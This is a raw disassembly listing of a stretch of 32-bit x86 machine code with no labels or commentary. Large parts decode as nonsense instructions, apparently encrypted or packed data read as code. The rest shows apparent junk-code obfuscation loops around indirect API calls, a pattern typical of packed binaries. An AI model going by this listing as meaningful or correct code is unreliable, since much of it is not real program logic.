  40fab9:	mov    DWORD PTR [ebp+0x8],esi
  40fabc:	or     esi,DWORD PTR ds:0x43365f
  40fac2:	mov    esi,DWORD PTR [ebp+0x8]
  40fac5:	xor    esi,ecx
  40fac7:	xor    esi,eax
  40fac9:	mov    eax,DWORD PTR [edx+0x194]
  40facf:	jmp    0x40fd9e
  40fad4:	daa    
  40fad5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fad6:	or     DWORD PTR [esi-0x5a484d63],eax
  40fadc:	scas   al,BYTE PTR es:[edi]
  40fadd:	add    al,0x3b
  40fadf:	clc    
  40fae0:	mov    eax,gs:0xb33d948c
  40fae6:	jl     0x40fb64
  40fae8:	scas   al,BYTE PTR es:[edi]
  40fae9:	jle    0x40fb67
  40faeb:	jl     0x40fb6b
  40faed:	dec    eax
  40faee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40faef:	neg    DWORD PTR gs:[edi]
  40faf2:	inc    esp
  40faf3:	pusha  
  40faf4:	xchg   esp,eax
  40faf5:	and    BYTE PTR [esi+0x6cd764c0],al
  40fafb:	push   edi
  40fafc:	mov    BYTE PTR [esp+edi*2],dl
  40faff:	mov    edi,0xfc0b7d46
  40fb04:	jmp    DWORD PTR [esi]
  40fb06:	fst    DWORD PTR fs:[ebx+0x5]
  40fb0a:	jns    0x40faed
  40fb0c:	mov    al,ds:0xb3bd1bf7
  40fb11:	nop
  40fb12:	push   eax
  40fb13:	jbe    0x40fac5
  40fb15:	lahf   
  40fb16:	mov    ds:0x4311d9dd,eax
  40fb1b:	fyl2x  
  40fb1d:	adc    BYTE PTR [edx-0x59977784],0xc3
  40fb24:	sub    al,0x42
  40fb26:	imul   esi,esi,0x4ec943e
  40fb2c:	push   eax
  40fb2d:	mov    eax,DWORD PTR [esi+0x45]
  40fb30:	lahf   
  40fb31:	and    ah,BYTE PTR [edi+0x0]
  40fb34:	xchg   ebp,eax
  40fb35:	inc    eax
  40fb36:	ret    0x3cae
  40fb39:	and    DWORD PTR [eax-0x18671c16],0xfe50ea56
  40fb43:	dec    ecx
  40fb44:	(bad)  
  40fb45:	in     al,dx
  40fb46:	cmp    al,0x31
  40fb48:	scas   al,BYTE PTR es:[edi]
  40fb49:	jmp    0x29dd:0x6cfd7783
  40fb50:	dec    esp
  40fb51:	sub    BYTE PTR [eax+0x10],ah
  40fb54:	inc    eax
  40fb55:	mov    al,0xa3
  40fb57:	std    
  40fb58:	xlat   BYTE PTR ds:[ebx]
  40fb59:	push   eax
  40fb5a:	bound  ebx,QWORD PTR [eax]
  40fb5c:	push   ss
  40fb5d:	mov    DWORD PTR [edx],ebp
  40fb5f:	dec    edi
  40fb60:	es aas 
  40fb62:	jbe    0x40fb86
  40fb64:	enter  0x8edb,0x29
  40fb68:	cmp    esp,ebx
  40fb6a:	fcmove st,st(6)
  40fb6c:	fsub   st(3),st
  40fb6e:	xchg   edx,eax
  40fb6f:	jae    0x40fb16
  40fb71:	or     eax,0x6e56bf6b
  40fb76:	mov    eax,ds:0xf8e4d64e
  40fb7b:	repz and ch,BYTE PTR [ecx-0x70]
  40fb7f:	cld    
  40fb80:	dec    esp
  40fb81:	stos   BYTE PTR es:[edi],al
  40fb82:	aas    
  40fb83:	in     eax,0xa9
  40fb85:	jp     0x40fb60
  40fb87:	out    0xba,eax
  40fb89:	xchg   esi,eax
  40fb8a:	ret    
  40fb8b:	mov    al,0xc8
  40fb8d:	mov    ebp,es
  40fb8f:	pop    ds
  40fb90:	sbb    BYTE PTR [ebx-0x3816e30f],0xce
  40fb97:	add    DWORD PTR [ebx],0xc0fe8923
  40fb9d:	dec    esp
  40fb9e:	repnz mov edi,0x3eeb0bb1
  40fba4:	push   0xccbf998f
  40fba9:	imul   edi,DWORD PTR [esp+edx*4-0x19d4de04],0x67
  40fbb1:	out    0x4a,eax
  40fbb3:	rcr    DWORD PTR [ecx],1
  40fbb5:	dec    edx
  40fbb6:	les    ebp,FWORD PTR [ebx+0x51]
  40fbb9:	pop    ebx
  40fbba:	add    BYTE PTR [eax+ecx*2-0x1b],ch
  40fbbe:	pop    ds
  40fbbf:	(bad)  
  40fbc0:	mov    eax,ds:0x4ea0d368
  40fbc5:	leave  
  40fbc6:	push   ebx
  40fbc7:	adc    al,BYTE PTR [ebp+0x3818d941]
  40fbcd:	das    
  40fbce:	add    eax,0x2c12ef13
  40fbd3:	cmp    DWORD PTR [ecx-0x28e71864],esp
  40fbd9:	mov    esi,0x7bbf9fd5
  40fbde:	cmp    cl,ah
  40fbe0:	dec    esi
  40fbe1:	push   cs
  40fbe2:	mov    dl,0x65
  40fbe4:	ss scas eax,DWORD PTR es:[edi]
  40fbe6:	xlat   BYTE PTR ds:[ebx]
  40fbe7:	out    0x3e,al
  40fbe9:	lahf   
  40fbea:	scas   eax,DWORD PTR es:[edi]
  40fbeb:	retf   
  40fbec:	inc    ebx
  40fbed:	jbe    0x40fb71
  40fbef:	(bad)  
  40fbf1:	out    0xd,eax
  40fbf3:	mov    ch,0xe9
  40fbf5:	or     al,0x95
  40fbf7:	xchg   esp,eax
  40fbf8:	or     esi,edi
  40fbfa:	push   es
  40fbfb:	xchg   DWORD PTR [ecx-0x5d],esp
  40fbfe:	push   esp
  40fbff:	scas   al,BYTE PTR es:[edi]
  40fc00:	fimul  WORD PTR [ecx]
  40fc02:	mov    cl,bl
  40fc04:	punpckhbw mm3,mm6
  40fc07:	retf   0x329d
  40fc0a:	xchg   edx,eax
  40fc0b:	or     al,0x8d
  40fc0d:	pushf  
  40fc0e:	or     DWORD PTR [ebx+0x3897ef94],edx
  40fc14:	iret   
  40fc15:	test   DWORD PTR [ebx+0x4c],0x477b9b25
  40fc1c:	xchg   esi,eax
  40fc1d:	mov    cl,0x27
  40fc1f:	or     DWORD PTR [esp+esi*2-0x63aeac55],edi
  40fc26:	mov    ds,WORD PTR [esi+0x4e3facec]
  40fc2c:	mov    al,ds:0xce1751b
  40fc31:	cwde   
  40fc32:	ss adc cl,ah
  40fc35:	sbb    bh,BYTE PTR [esi-0x6e]
  40fc38:	idiv   bh
  40fc3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc3b:	test   al,0x8d
  40fc3e:	adc    DWORD PTR [edi+0x1e],ebp
  40fc41:	jne    0x40fc30
  40fc43:	xchg   edx,eax
  40fc44:	xor    eax,0x44ada3f2
  40fc49:	sub    esi,DWORD PTR [edx-0x5f9b0e79]
  40fc4f:	cmp    edi,eax
  40fc51:	xchg   edi,eax
  40fc52:	jnp    0x40fbdd
  40fc54:	jmp    0xaf5b0416
  40fc59:	scas   al,BYTE PTR es:[edi]
  40fc5a:	pushf  
  40fc5b:	push   0xfe8aceef
  40fc60:	mov    dh,0xc9
  40fc62:	inc    esp
  40fc63:	jo     0x40fc79
  40fc65:	cmp    esi,DWORD PTR [ecx+ebp*8-0x552c4cd8]
  40fc6c:	sbb    al,0xc3
  40fc6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc6f:	xchg   edx,eax
  40fc70:	mov    ecx,0x9ebddc6a
  40fc75:	xor    edi,edx
  40fc77:	cmp    eax,0x1e3dff22
  40fc7c:	out    dx,eax
  40fc7d:	jns    0x40fc30
  40fc7f:	xor    BYTE PTR [eax+0x614d3de4],dl
  40fc85:	loopne 0x40fcff
  40fc87:	stos   DWORD PTR es:[edi],eax
  40fc88:	int    0x9d
  40fc8a:	dec    ebx
  40fc8b:	test   BYTE PTR [esp+ecx*4],cl
  40fc8e:	xor    dl,BYTE PTR [edx+eax*4]
  40fc91:	fcmovne st,st(3)
  40fc93:	add    ebp,DWORD PTR [ecx]
  40fc95:	mov    WORD PTR ds:0xa170ff6,fs
  40fc9b:	jno    0x40fc7f
  40fc9d:	xor    eax,0xd39121e1
  40fca2:	bound  esp,QWORD PTR [eax-0x4b]
  40fca5:	in     eax,0x4d
  40fca7:	pop    ds
  40fca8:	mov    esp,esp
  40fcaa:	(bad)  
  40fcab:	arpl   WORD PTR [esp+ebp*2+0x28219309],bp
  40fcb2:	mov    ah,0xbf
  40fcb4:	cmp    al,0xd3
  40fcb6:	into   
  40fcb7:	fst    QWORD PTR [esi+ebp*4-0x1b4888f]
  40fcbe:	push   ebp
  40fcbf:	xor    DWORD PTR [edi+0x56],ebp
  40fcc2:	fs mov esp,0x15f0b7af
  40fcc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcc9:	or     DWORD PTR [edx+edi*1-0x7e46f66d],ebx
  40fcd0:	and    edi,esp
  40fcd2:	(bad)  
  40fcd3:	int3   
  40fcd4:	add    ch,BYTE PTR [edi-0x4f]
  40fcd7:	xor    DWORD PTR [edi],0xf765425a
  40fcdd:	(bad)  
  40fcde:	in     eax,0xba
  40fce0:	mov    cl,0x68
  40fce2:	mov    esi,0xc0f47ad0
  40fce7:	repz mov ebp,0x913db87b
  40fced:	cmp    eax,0x4237f332
  40fcf2:	push   ebp
  40fcf3:	push   edi
  40fcf4:	test   al,0x60
  40fcf6:	lods   al,BYTE PTR ds:[esi]
  40fcf7:	inc    esi
  40fcf8:	fstp   DWORD PTR [ebx+0x30]
  40fcfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcfc:	out    dx,al
  40fcfd:	lods   eax,DWORD PTR ds:[esi]
  40fcfe:	scas   al,BYTE PTR es:[edi]
  40fcff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd00:	into   
  40fd01:	inc    esi
  40fd02:	or     DWORD PTR [edi],ebp
  40fd04:	sub    eax,0xd126e3d1
  40fd09:	inc    DWORD PTR [ebp+ebp*4-0x7e7bc18f]
  40fd10:	xor    BYTE PTR [eax],cl
  40fd12:	rcl    BYTE PTR [eax+0x15],1
  40fd15:	mov    eax,0xe1b6adc0
  40fd1a:	mov    esp,0x3ce9aea7
  40fd1f:	mov    ?,WORD PTR [eax]
  40fd21:	or     ax,0x31c9
  40fd25:	dec    edi
  40fd26:	adc    bh,bl
  40fd28:	cmp    ebp,ebx
  40fd2a:	imul   ebx,esp,0x5346362c
  40fd30:	inc    edi
  40fd31:	push   0x90f17edc
  40fd36:	dec    edx
  40fd37:	add    bh,BYTE PTR [ecx]
  40fd39:	fucomi st,st(2)
  40fd3b:	push   esp
  40fd3c:	sbb    eax,0x5a538771
  40fd41:	push   es
  40fd42:	xchg   ecx,eax
  40fd43:	or     esp,DWORD PTR [esi]
  40fd45:	xor    eax,0xb484f73c
  40fd4a:	bound  ebx,QWORD PTR [edi]
  40fd4c:	mov    ah,0xfc
  40fd4e:	imul   edx,DWORD PTR [eax-0x6],0xfb540b7a
  40fd55:	mov    eax,DWORD PTR [edi+0x5f2e8351]
  40fd5b:	(bad)  
  40fd5c:	and    edx,DWORD PTR [ebx-0xa4c561b]
  40fd62:	int3   
  40fd63:	sub    al,0xa2
  40fd65:	dec    eax
  40fd66:	lods   al,BYTE PTR ds:[esi]
  40fd67:	sar    BYTE PTR [ebp+0x5f32e66d],1
  40fd6d:	ds dec edi
  40fd6f:	pop    edx
  40fd70:	jmp    0x40fd2a
  40fd72:	rcl    BYTE PTR [ebx+0x37],1
  40fd75:	call   edi
  40fd77:	ins    DWORD PTR es:[edi],dx
  40fd78:	out    dx,al
  40fd79:	mov    ebp,0x167bf37e
  40fd7e:	xchg   esp,eax
  40fd7f:	adc    al,BYTE PTR [eax]
  40fd81:	test   al,0xd1
  40fd83:	adc    DWORD PTR [ecx+ebx*2+0x1],0x52
  40fd88:	pushf  
  40fd89:	sbb    al,0x6d
  40fd8b:	repnz push ss
  40fd8d:	adc    ebp,DWORD PTR [ebx]
  40fd8f:	ins    BYTE PTR es:[edi],dx
  40fd90:	push   esi
  40fd91:	or     ah,BYTE PTR [edi+0x76]
  40fd94:	mov    bh,0x39
  40fd96:	add    eax,0xc33f3a86
  40fd9b:	std    
  40fd9c:	mov    ds:0x11088b23,al
  40fda1:	adc    eax,0x43365f
  40fda6:	mov    eax,DWORD PTR [ecx+0x3c]
  40fda9:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40fdad:	add    eax,ecx
  40fdaf:	mov    DWORD PTR [ebp+0x8],esi
  40fdb2:	mov    DWORD PTR [ebp+0x10],eax
  40fdb5:	jmp    0x410084
  40fdba:	in     al,0xad
  40fdbc:	jae    0x40fd87
  40fdbe:	jge    0x40fd89
  40fdc0:	bound  edi,QWORD PTR [ebp-0x71547538]
  40fdc6:	out    0x27,eax
  40fdc8:	int3   
  40fdc9:	inc    edx
  40fdca:	outs   dx,DWORD PTR ds:[esi]
  40fdcb:	mov    ebp,0x7eae7c7c
  40fdd0:	jl     0x40fe4e
  40fdd2:	test   al,0x41
  40fdd4:	repz xor eax,0xae965054
  40fdda:	(bad)  
  40fddb:	mov    WORD PTR [ecx-0x4d0ece39],cx
  40fde2:	sub    BYTE PTR [esi],al
  40fde4:	xchg   ecx,eax
  40fde5:	daa    
  40fde6:	mov    esp,0xc93e2c0b
  40fdeb:	retf   0x3131
  40fdee:	addr16 adc eax,0x7dd3d3b5
  40fdf4:	test   DWORD PTR [esi+0x2034ade],esi
  40fdfa:	lock cli 
  40fdfc:	jl     0x40fe0c
  40fdfe:	fidiv  WORD PTR [edi+edi*2-0x36]
  40fe02:	(bad)  
  40fe04:	xchg   edi,eax
  40fe05:	jmp    0xbbe8ec4a
  40fe0a:	fdivrp st(6),st
  40fe0c:	mov    ebp,0x210165f3
  40fe11:	xor    ebx,DWORD PTR [edi]
  40fe13:	pusha  
  40fe14:	in     al,dx
  40fe15:	test   eax,0x1e9aae65
  40fe1a:	add    bl,BYTE PTR [edx-0x36aff0e7]
  40fe20:	(bad)
  40fe24:	dec    edi
  40fe25:	or     cl,BYTE PTR [ebp-0x37961075]
  40fe2b:	xchg   edx,eax
  40fe2c:	push   ecx
  40fe2d:	xlat   BYTE PTR ds:[ebx]
  40fe2e:	dec    ebx
  40fe2f:	bound  eax,QWORD PTR [edi-0x2f]
  40fe32:	mov    dl,BYTE PTR [ebp-0x1d83b791]
  40fe38:	jnp    0x40fe1c
  40fe3a:	mov    edx,0xe2d6bfd9
  40fe3f:	inc    eax
  40fe40:	das    
  40fe41:	add    esp,0x39c9f2a6
  40fe47:	mov    ebp,0x8f84753a
  40fe4c:	jo     0x40feb5
  40fe4e:	ret    
  40fe4f:	and    eax,0xf039a60b
  40fe54:	pop    esi
  40fe55:	xor    BYTE PTR [edi-0x6fe64252],dl
  40fe5b:	ins    BYTE PTR es:[edi],dx
  40fe5c:	mov    esp,0x941bb8ad
  40fe61:	inc    ecx
  40fe62:	out    dx,eax
  40fe63:	add    eax,ecx
  40fe65:	mov    ah,0xdd
  40fe67:	lea    esp,[ecx-0x7efc3bf]
  40fe6d:	jbe    0x40fdfd
  40fe6f:	scas   al,BYTE PTR es:[edi]
  40fe70:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40fe72:	xchg   ebx,eax
  40fe73:	rcl    eax,0xd6
  40fe76:	int3   
  40fe77:	loope  0x40fee5
  40fe79:	jne    0x40fead
  40fe7b:	mov    BYTE PTR [ebp+0x69],ah
  40fe7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe7f:	out    dx,al
  40fe80:	mov    ebp,0x16af756b
  40fe85:	jb     0x40fe84
  40fe87:	or     ebx,esp
  40fe89:	dec    eax
  40fe8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe8b:	fwait
  40fe8c:	ja     0x40fe79
  40fe8e:	add    bl,BYTE PTR [ecx]
  40fe90:	mov    ebx,0x8b63b6fb
  40fe95:	dec    ecx
  40fe96:	sar    DWORD PTR [esi],1
  40fe98:	cmp    BYTE PTR [ebp+edi*1-0x55],0x6b
  40fe9d:	push   ss
  40fe9e:	rol    ecx,1
  40fea0:	outs   dx,BYTE PTR ds:[esi]
  40fea1:	repnz sar ch,0x65
  40fea5:	mov    DWORD PTR [ebp+0x75],esp
  40fea8:	pop    ds
  40fea9:	jl     0x40fe73
  40feab:	nop
  40feac:	aas    
  40fead:	add    DWORD PTR [esi-0x7a977a00],0x61
  40feb4:	call   0x3eb0:0xc000f03e
  40febb:	and    BYTE PTR [esi],dl
  40febd:	in     eax,dx
  40febe:	adc    al,0xb
  40fec0:	or     bl,BYTE PTR [esi+0x13]
  40fec3:	and    edi,eax
  40fec5:	es and al,0x1c
  40fec8:	sbb    BYTE PTR [ebx-0x71a55b46],al
  40fece:	test   eax,0x1461aa43
  40fed3:	mov    al,ds:0x2a8be454
  40fed8:	mov    WORD PTR [edx],?
  40feda:	and    al,0x10
  40fedc:	push   cs
  40fedd:	das    
  40fede:	imul   cl
  40fee0:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40fee2:	stos   DWORD PTR es:[edi],eax
  40fee3:	xchg   ecx,eax
  40fee4:	(bad)  [esp-0x627d58fb]
  40feeb:	in     eax,dx
  40feec:	int    0x3b
  40feee:	in     al,dx
  40feef:	xchg   ebp,eax
  40fef0:	add    ah,ch
  40fef2:	push   0xffffffb7
  40fef4:	imul   esp,DWORD PTR [esi+0x2ca9c999],0xffffffd0
  40fefb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fefc:	pop    DWORD PTR [esi]
  40fefe:	sti    
  40feff:	jecxz  0x40fefe
  40ff01:	out    0x3d,eax
  40ff03:	mov    dl,0x2b
  40ff05:	xor    al,0x54
  40ff07:	leave  
  40ff08:	cld    
  40ff09:	stos   DWORD PTR es:[edi],eax
  40ff0a:	pop    ecx
  40ff0b:	sub    al,ch
  40ff0d:	shr    BYTE PTR [ebx+0x17],cl
  40ff10:	and    DWORD PTR [ebx-0x49a17305],ebx
  40ff16:	or     eax,0x244ab0ed
  40ff1b:	fbstp  TBYTE PTR [esi]
  40ff1d:	cmp    eax,0xbae82e84
  40ff22:	shr    BYTE PTR [edx-0x6a1f330d],cl
  40ff28:	xchg   BYTE PTR [edi],ch
  40ff2a:	int3   
  40ff2b:	jmp    0x39ea8f67
  40ff30:	or     ch,BYTE PTR [esp+ebx*1-0x6b]
  40ff34:	imul   DWORD PTR [ebp-0x4fdc67e]
  40ff3a:	test   eax,0xc2121bf8
  40ff3f:	push   edx
  40ff40:	lods   al,BYTE PTR ds:[esi]
  40ff41:	(bad)
  40ff46:	cdq    
  40ff47:	sbb    al,0xae
  40ff49:	call   0xcaf8:0x6b0b44d3
  40ff50:	inc    edx
  40ff51:	sti    
  40ff52:	jg     0x40ff81
  40ff54:	push   ds
  40ff55:	add    eax,0x36109414
  40ff5a:	mov    bh,0x95
  40ff5c:	enter  0x3be8,0xc2
  40ff60:	shl    ebx,1
  40ff62:	inc    ebx
  40ff63:	jp     0x40ff2a
  40ff65:	pop    eax
  40ff66:	fsub   st(5),st
  40ff68:	mov    esp,0xe1e8ba8f
  40ff6d:	dec    eax
  40ff6e:	sbb    BYTE PTR [ebx-0x2f],bl
  40ff71:	sub    eax,DWORD PTR [ecx+0x4ad60591]
  40ff77:	and    al,0x86
  40ff79:	faddp  st(3),st
  40ff7b:	mov    es,edi
  40ff7d:	sbb    DWORD PTR [eax],edi
  40ff7f:	pop    edx
  40ff80:	sbb    al,0x1d
  40ff82:	lock cmp eax,0x60ee3cfe
  40ff88:	je     0x40ff97
  40ff8a:	jge    0x40ff98
  40ff8c:	loope  0x40ff32
  40ff8e:	or     al,0x59
  40ff90:	sbb    DWORD PTR [esi],ebx
  40ff92:	rol    al,cl
  40ff94:	xlat   BYTE PTR ds:[ebx]
  40ff95:	or     al,al
  40ff97:	js     0x40ffd7
  40ff99:	(bad)
  40ff9d:	aas    
  40ff9e:	ror    BYTE PTR [edi+0x6],0xea
  40ffa2:	out    0x73,eax
  40ffa4:	les    edi,FWORD PTR [edx+0x70]
  40ffa7:	outs   dx,DWORD PTR ds:[esi]
  40ffa8:	les    esp,FWORD PTR [esp+eax*4]
  40ffab:	xchg   ecx,eax
  40ffac:	jns    0x40fff1
  40ffae:	outs   dx,BYTE PTR ds:[esi]
  40ffaf:	push   es
  40ffb0:	cs ins BYTE PTR es:[edi],dx
  40ffb2:	mov    eax,0x92526003
  40ffb7:	test   eax,0x42b748c
  40ffbc:	pop    edi
  40ffbd:	xchg   edx,eax
  40ffbe:	rcr    DWORD PTR [edi+0x26],cl
  40ffc1:	adc    ch,0x87
  40ffc4:	dec    ecx
  40ffc5:	loop   0x40ff51
  40ffc7:	or     BYTE PTR [edi-0x77f46435],cl
  40ffcd:	mov    al,ds:0x568f2bf6
  40ffd2:	jnp    0x40ffd1
  40ffd4:	aaa    
  40ffd5:	hlt    
  40ffd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffd7:	je     0x41004a
  40ffd9:	loope  0x410011
  40ffdb:	add    al,0x29
  40ffdd:	jmp    0x410011
  40ffdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffe0:	in     eax,dx
  40ffe1:	lds    eax,FWORD PTR [esp+edx*8+0x4b]
  40ffe5:	cmp    BYTE PTR [ebx+0x64],bl
  40ffe8:	jns    0x40ffac
  40ffea:	pop    edx
  40ffeb:	push   0x5ee5e174
  40fff0:	popa   
  40fff1:	mov    al,0x43
  40fff3:	cmp    ebp,DWORD PTR [eax-0x10]
  40fff6:	sub    cl,BYTE PTR [ecx+0x2b66ec5a]
  40fffc:	adc    ah,bl
  40fffe:	das    
  40ffff:	cmc    
  410000:	cmp    eax,0x5e5416fb
  410005:	pop    edx
  410006:	push   ecx
  410007:	fistp  QWORD PTR [eax]
  410009:	sti    
  41000a:	shr    BYTE PTR [ebp-0x67],cl
  41000d:	int    0x6e
  41000f:	lea    ebx,[ebx]
  410011:	ins    BYTE PTR es:[edi],dx
  410012:	arpl   WORD PTR [eax-0x497ab5d1],di
  410018:	ret    
  410019:	call   0xb4b29636
  41001e:	adc    eax,0x2868ace2
  410023:	das    
  410024:	mov    DWORD PTR [edi-0x4ff8f2bc],ebp
  41002a:	mov    BYTE PTR [ecx-0x59],al
  41002d:	adc    ebx,esi
  41002f:	stc    
  410030:	cmp    DWORD PTR [esi+edx*8-0x6cc002b2],ebx
  410037:	in     eax,dx
  410038:	jnp    0x410092
  41003a:	sub    BYTE PTR [ebx],bh
  41003c:	icebp  
  41003d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41003e:	inc    ecx
  41003f:	xchg   ebp,eax
  410040:	fs cmp al,0x39
  410043:	or     eax,0xd234f5d
  410048:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410049:	xor    ah,BYTE PTR [ebx+0x1d359773]
  41004f:	push   0xfffffff6
  410051:	lods   eax,DWORD PTR ds:[esi]
  410052:	repnz mov ds:0xb2b9a056,al
  410058:	in     eax,dx
  410059:	pop    esp
  41005a:	lahf   
  41005b:	pop    esp
  41005c:	retf   0xbdc3
  41005f:	retf   0x569b
  410062:	pop    ebp
  410063:	and    ch,BYTE PTR [eax+eiz*1-0x6490589]
  41006a:	call   0x17d5cb23
  41006f:	loopne 0x4100a5
  410071:	jnp    0x41007a
  410073:	xor    ah,dl
  410075:	in     eax,0xf0
  410077:	pop    DWORD PTR [edx]
  410079:	push   eax
  41007a:	push   0xffffffef
  41007c:	imul   edi,DWORD PTR [edi-0x6f],0x9238a96b
  410083:	jne    0x410010
  410085:	inc    ebp
  410086:	adc    BYTE PTR [esi-0x7b],bl
  410089:	ror    BYTE PTR [edi],0x84
  41008c:	push   ds
  41008d:	add    BYTE PTR [eax],al
  41008f:	add    bh,bh
  410091:	xor    eax,0x413bee
  410096:	push   DWORD PTR ds:0x41399a
  41009c:	mov    eax,DWORD PTR [edx+0x194]
  4100a2:	push   DWORD PTR [eax]
  4100a4:	mov    eax,DWORD PTR [ebp+0x10]
  4100a7:	call   eax
  4100a9:	jmp    0x4100b1
  4100ae:	mov    eax,DWORD PTR [ebp+0x10]
  4100b1:	leave  
  4100b2:	ret    0xc
  4100b5:	push   ebp
  4100b6:	mov    ebp,esp
  4100b8:	sub    esp,0x30
  4100bb:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  4100c2:	and    DWORD PTR ds:0x4336df,0x0
  4100cc:	jmp    0x4100dc
  4100d1:	mov    eax,ds:0x4336df
  4100d6:	inc    eax
  4100d7:	mov    ds:0x4336df,eax
  4100dc:	cmp    DWORD PTR ds:0x4336df,0x1a
  4100e3:	jae    0x41011c
  4100e9:	cmp    DWORD PTR ds:0x4336df,0x4
  4100f0:	jne    0x4100ff
  4100f6:	push   DWORD PTR [ebp-0x20]
  4100f9:	call   DWORD PTR ds:0x4120d4
  4100ff:	cmp    DWORD PTR ds:0x4336df,0x3
  410106:	jne    0x410117
  41010c:	mov    eax,ds:0x4336df
  410111:	inc    eax
  410112:	mov    ds:0x4336df,eax
  410117:	jmp    0x4100d1
  41011c:	mov    DWORD PTR [ebp-0x18],0xf89c8534
  410123:	sbb    eax,DWORD PTR ds:0x433773
  410129:	mov    ecx,DWORD PTR [ebp-0x4]
  41012c:	push   ebx
  41012d:	mov    eax,0x7510853
  410132:	dec    ebx
  410133:	xor    ecx,eax
  410135:	or     DWORD PTR ds:0x433657,0x33e5
  41013f:	mov    ebx,0x32729a
  410144:	sbb    DWORD PTR ds:0x4336df,0x4336e3
  41014e:	add    ecx,ebx
  410150:	and    DWORD PTR ds:0x43364f,0x433647
  41015a:	mov    DWORD PTR [ebp-0x1c],ecx
  41015d:	mov    ecx,DWORD PTR [ebp+0x14]
  410160:	sub    DWORD PTR ds:0x4336e7,0x6109
  41016a:	push   esi
  41016b:	push   edi
  41016c:	sbb    DWORD PTR ds:0x433723,0x433757
  410176:	test   ecx,ecx
  410178:	je     0x410196
  41017e:	mov    DWORD PTR ds:0x433757,0x2f8
  410188:	mov    ecx,DWORD PTR [ebp+0x14]
  41018b:	mov    ecx,DWORD PTR [ecx]
  41018d:	and    edi,DWORD PTR ds:0x433697
  410193:	mov    DWORD PTR [ebp-0x1c],ecx
  410196:	add    DWORD PTR ds:0x433723,0x2cfa
  4101a0:	imul   edx,eax
  4101a3:	add    DWORD PTR ds:0x433657,edx
  4101a9:	mov    ecx,0x4573
  4101ae:	xor    edi,edi
  4101b0:	or     edi,DWORD PTR ds:0x433777
  4101b6:	mov    esi,DWORD PTR ds:0x43378b
  4101bc:	sub    edi,esi
  4101be:	xor    edi,DWORD PTR [edi+esi*1]
  4101c1:	add    edx,ecx
  4101c3:	sub    DWORD PTR ds:0x433663,0x43369b
  4101cd:	mov    esi,0x7879
  4101d2:	mov    edi,0x1556
  4101d7:	xchg   esi,ecx
  4101d9:	and    DWORD PTR ds:0x433733,0x0
  4101e3:	mov    ecx,DWORD PTR ds:0x433733
  4101e9:	inc    ecx
  4101ea:	mov    DWORD PTR ds:0x433733,ecx
  4101f0:	cmp    DWORD PTR ds:0x433733,0x29
  4101f7:	jne    0x41023f
  4101fd:	push   0x433914
  410202:	push   DWORD PTR [ebp-0x14]
  410205:	push   DWORD PTR [ebp-0xc]
  410208:	push   0x8a72
  41020d:	push   0x8052
  410212:	push   0x5318
  410217:	push   0x69ba
  41021c:	push   0x74de
  410221:	push   0x7da6
  410226:	push   DWORD PTR [ebp-0x1c]
  410229:	push   DWORD PTR [ebp-0x24]
  41022c:	push   DWORD PTR [ebp-0x18]
  41022f:	push   0x2962
  410234:	push   0x6ae2
  410239:	call   DWORD PTR ds:0x4120d8
  41023f:	cmp    DWORD PTR ds:0x433733,0x1c
  410246:	jb     0x4101e3
  41024c:	sub    edx,edi
  41024e:	adc    DWORD PTR ds:0x433763,edi
  410254:	xor    esi,esi
  410256:	and    DWORD PTR ds:0x433757,0x0
  410260:	mov    ecx,DWORD PTR ds:0x433757
  410266:	inc    ecx
  410267:	mov    DWORD PTR ds:0x433757,ecx
  41026d:	cmp    DWORD PTR ds:0x433757,0xf
  410274:	jne    0x410288
  41027a:	push   DWORD PTR [ebp-0x10]
  41027d:	push   0x178b
  410282:	call   DWORD PTR ds:0x4121c0
  410288:	cmp    DWORD PTR ds:0x433757,0xe
  41028f:	jne    0x4102a4
  410295:	xor    ecx,ecx
  410297:	xor    ecx,DWORD PTR ds:0x433757
  41029d:	inc    ecx
  41029e:	mov    DWORD PTR ds:0x433757,ecx
  4102a4:	cmp    DWORD PTR ds:0x433757,0x1b
  4102ab:	jb     0x410260
  4102b1:	inc    ecx
  4102b2:	mov    DWORD PTR [ebp-0x28],esi
  4102b5:	not    ecx
  4102b7:	mov    DWORD PTR [ebp-0x2c],esi
  4102ba:	and    DWORD PTR ds:0x433723,0x0
  4102c4:	xor    ecx,ecx
  4102c6:	xor    ecx,DWORD PTR ds:0x433723
  4102cc:	inc    ecx
  4102cd:	mov    DWORD PTR ds:0x433723,ecx
  4102d3:	cmp    DWORD PTR ds:0x433723,0x22
  4102da:	jne    0x4102e9
  4102e0:	push   DWORD PTR [ebp-0x1c]
  4102e3:	call   DWORD PTR ds:0x412284
  4102e9:	cmp    DWORD PTR ds:0x433723,0x17
  4102f0:	jb     0x4102c4
  4102f6:	add    ecx,DWORD PTR ds:0x4336eb
  4102fc:	mov    DWORD PTR [ebp-0x14],esi
  4102ff:	mov    DWORD PTR [ebp-0x8],esi
  410302:	sub    DWORD PTR ds:0x43372b,0x6d7d
  41030c:	mov    ecx,DWORD PTR [ebp-0x18]
  41030f:	xor    DWORD PTR ds:0x4336e3,0x433647
  410319:	xor    ecx,eax
  41031b:	and    DWORD PTR ds:0x433733,0x0
  410325:	mov    eax,ds:0x433733
  41032a:	inc    eax
  41032b:	mov    ds:0x433733,eax
  410330:	cmp    DWORD PTR ds:0x433733,0xd
  410337:	jne    0x410348
  41033d:	push   0x8573
  410342:	call   DWORD PTR ds:0x4120dc
  410348:	cmp    DWORD PTR ds:0x433733,0xc
